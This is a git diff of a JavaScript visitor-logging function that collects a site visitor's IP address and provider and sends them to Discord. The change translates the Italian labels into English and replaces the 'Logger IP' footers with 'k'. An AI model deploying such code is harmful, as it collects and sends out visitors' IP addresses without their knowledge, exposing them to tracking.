@@ -45,50 +45,50 @@ async function logVisit() {
   try {
     const { ip, provider } = await getIP();
     const embed = {
-      title: "Nuova Visita Rilevata",
+      title: "Log",
       color: 5814783, // Colore blu
       fields: [
         {
-          name: "Indirizzo IP",
+          name: "IP Adress",
           value: ip,
           inline: true
         },
         {
-          name: "Provider Utilizzato",
+          name: "Provider",
           value: provider,
           inline: true
         },
         {
-          name: "Data e Ora",
+          name: "Date and Time",
           value: currentDate,
           inline: false
         }
       ],
       footer: {
-        text: "Logger IP"
+        text: "k"
       }
     };
     await sendToDiscord(embed);
   } catch (error) {
     console.error('Errore nel recupero dell\'IP:', error);
     const errorEmbed = {
-      title: "Errore nel Recupero IP",
+      title: "Error in Retrieving IP",
       color: 15158332, // Colore rosso
-      description: `Impossibile recuperare l'IP del visitatore`,
+      description: `Unable to retrieve the visitor's IP`,
       fields: [
         {
-          name: "Errore",
+          name: "Error",
           value: error.message,
           inline: false
         },
         {
-          name: "Data e Ora",
+          name: "Date and Time",
           value: currentDate,
           inline: false
         }
       ],
       footer: {
-        text: "Logger IP - Errore"
+        text: "k"
       }
     };
     await sendToDiscord(errorEmbed);
